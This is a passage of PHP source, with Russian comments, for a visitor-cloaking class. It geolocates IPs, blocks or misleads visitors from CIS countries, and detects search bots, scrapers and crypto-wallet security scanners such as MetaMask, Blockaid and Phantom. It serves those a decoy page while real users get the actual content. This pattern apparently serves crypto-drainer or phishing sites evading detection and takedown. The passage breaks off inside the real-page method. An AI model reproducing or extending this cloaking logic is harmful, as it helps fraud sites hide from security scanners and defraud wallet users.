    public function __construct(array $bindings = [], array $customConfig = [])
    {
        $this->config = array_merge($this->config, $customConfig);
        $this->bindings = $bindings;
        $this->clientIp = $this->getRealClientIp();
        $this->userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $this->countryCode = $this->getCountryCode();
        $this->isBot = $this->detectBot();
        $this->botType = $this->getBotType();
        $this->route();
    }

    // ==================== ОСНОВНЫЕ МЕТОДЫ ====================
    
    private function getRealClientIp(): string
    {
        $ipHeaders = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
        foreach ($ipHeaders as $header) {
            if (!empty($_SERVER[$header])) {
                $ips = explode(',', $_SERVER[$header]);
                $ip = trim($ips[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }

    private function getCountryCode(): string
    {
        foreach ($this->cngIpRanges as $range) {
            if ($this->ipInRange($this->clientIp, $range)) {
                return 'CNG';
            }
        }
        try {
            $response = @file_get_contents("http://ip-api.com/json/{$this->clientIp}?fields=countryCode");
            if ($response) {
                $data = json_decode($response, true);
                if (isset($data['countryCode'])) {
                    return $data['countryCode'];
                }
            }
        } catch (Exception $e) {}
        return 'XX';
    }

    private function ipInRange(string $ip, string $range): bool
    {
        list($subnet, $bits) = explode('/', $range);
        $ip = ip2long($ip);
        $subnet = ip2long($subnet);
        $mask = -1 << (32 - $bits);
        $subnet &= $mask;
        return ($ip & $mask) == $subnet;
    }

    private function detectBot(): bool
    {
        foreach ($this->config['whitelist_user_agents'] as $agent) {
            if (stripos($this->userAgent, $agent) !== false) {
                return true;
            }
        }
        if ($this->config['block_crypto_scanners']) {
            $cryptoSignatures = ['metamask', 'coinbase', 'blockaid', 'trustwallet', 'rabby', 'phantom', 'walletconnect', 'web3.js', 'ethers.js'];
            foreach ($cryptoSignatures as $sig) {
                if (stripos($this->userAgent, $sig) !== false) {
                    return true;
                }
            }
        }
        $botSignatures = ['bot', 'crawler', 'spider', 'scanner', 'scrape', 'curl', 'wget', 'python', 'java', 'ruby', 'perl', 'node', 'go', 'headless', 'phantom', 'puppeteer', 'selenium', 'webdriver'];
        foreach ($botSignatures as $sig) {
            if (stripos($this->userAgent, $sig) !== false) {
                return true;
            }
        }
        return false;
    }

    private function getBotType(): string
    {
        $ua = strtolower($this->userAgent);
        if (stripos($ua, 'googlebot') !== false) return 'google';
        if (stripos($ua, 'yandexbot') !== false) return 'yandex';
        if (stripos($ua, 'bingbot') !== false) return 'bing';
        if (stripos($ua, 'duckduckbot') !== false) return 'duckduckgo';
        if (stripos($ua, 'baiduspider') !== false) return 'baidu';
        if (stripos($ua, 'twitterbot') !== false || stripos($ua, 'twitter') !== false) return 'twitter';
        if (stripos($ua, 'metamask') !== false) return 'metamask';
        if (stripos($ua, 'coinbase') !== false) return 'coinbase';
        if (stripos($ua, 'blockaid') !== false) return 'blockaid';
        if (stripos($ua, 'trustwallet') !== false) return 'trustwallet';
        if (stripos($ua, 'rabby') !== false) return 'rabby';
        if (stripos($ua, 'phantom') !== false) return 'phantom';
        if (stripos($ua, 'bot') !== false) return 'generic_bot';
        if (stripos($ua, 'crawler') !== false) return 'crawler';
        if (stripos($ua, 'scanner') !== false) return 'scanner';
        if (stripos($ua, 'curl') !== false) return 'curl';
        if (stripos($ua, 'python') !== false) return 'python';
        if (stripos($ua, 'headless') !== false) return 'headless';
        return 'unknown';
    }

    private function isCngCountry(): bool
    {
        return in_array($this->countryCode, $this->config['cng_countries']) || $this->countryCode === 'CNG';
    }

    // ==================== МАРШРУТИЗАЦИЯ ====================
    
    private function route(): void
    {
        // 1. Белый список IP
        if (in_array($this->clientIp, $this->config['whitelist_ips'])) {
            $this->serveRealPage();
            return;
        }
        
        // 2. СНГ страны
        if ($this->isCngCountry()) {
            $this->handleCng();
            return;
        }
        
        // 3. Боты
        if ($this->isBot) {
            $this->handleBot();
            return;
        }
        
        // 4. Реальные пользователи
        $this->serveRealPage();
    }

    private function handleCng(): void
    {
        $this->logAccess('cng_blocked', "Страна: {$this->countryCode}, IP: {$this->clientIp}");
        switch ($this->config['cng_mode']) {
            case 'block':
                http_response_code(403);
                header('X-Robots-Tag: noindex, nofollow');
                header('Content-Type: text/html; charset=utf-8');
                die('
                    <!DOCTYPE html>
                    <html>
                    <head><title>Access Denied</title></head>
                    <body style="font-family: Arial; text-align: center; padding: 50px;">
                        <h1 style="color: #e53e3e;">🚫 Access Denied</h1>
                        <p>Access to this resource is restricted in your region.</p>
                    </body>
                    </html>
                ');
                exit();
            case 'redirect':
                header('Location: ' . $this->config['cng_redirect_url']);
                exit();
            case 'fake':
            case 'hybrid':
            default:
                $this->serveBotPage();
                break;
        }
    }

    private function handleBot(): void
    {
        $this->logAccess('bot_detected', "Тип: {$this->botType}, UA: {$this->userAgent}");
        
        // Проверяем биндинг для конкретного бота
        $binding = $this->getBinding($this->botType);
        if ($binding) {
            $this->serveBinding($binding);
            return;
        }

        switch ($this->config['bot_mode']) {
            case 'redirect':
                header('Location: ' . $this->config['bot_redirect_url']);
                exit();
            case 'error':
                http_response_code(404);
                die('404 Not Found');
            case 'fake_page':
            default:
                $this->serveBotPage();
                break;
        }
    }

    private function getBinding(string $botType): ?array
    {
        if (isset($this->bindings[$botType])) {
            return $this->bindings[$botType];
        }
        
        $categories = [
            'search' => ['google', 'yandex', 'bing', 'duckduckgo', 'baidu'],
            'crypto' => ['metamask', 'coinbase', 'blockaid', 'trustwallet', 'rabby', 'phantom'],
            'social' => ['twitter', 'facebook', 'instagram', 'linkedin'],
            'generic' => ['generic_bot', 'crawler', 'scanner']
        ];
        foreach ($categories as $category => $types) {
            if (in_array($botType, $types) && isset($this->bindings[$category])) {
                return $this->bindings[$category];
            }
        }
        
        if (isset($this->bindings['default_bot'])) {
            return $this->bindings['default_bot'];
        }
        
        return null;
    }

    private function serveBinding(array $binding): void
    {
        $type = $binding['type'] ?? 'file';
        $path = $binding['path'] ?? null;
        
        if (!$path) {
            $this->serveBotPage();
            return;
        }
        
        switch ($type) {
            case 'file':
                if (file_exists($path)) {
                    $ext = pathinfo($path, PATHINFO_EXTENSION);
                    $mimeTypes = ['html' => 'text/html', 'htm' => 'text/html', 'php' => 'text/html', 'txt' => 'text/plain', 'json' => 'application/json'];
                    $mime = $mimeTypes[$ext] ?? 'text/html';
                    header('Content-Type: ' . $mime);
                    readfile($path);
                    exit();
                }
                break;
            case 'url':
                header('Location: ' . $path);
                exit();
            case 'inline':
                echo $path;
                exit();
        }
        $this->serveBotPage();
    }

    private function serveRealPage(): void
    {
        if (isset($this->bindings['real_user'])) {
            $this->serveBinding($this->bindings['real_user']);
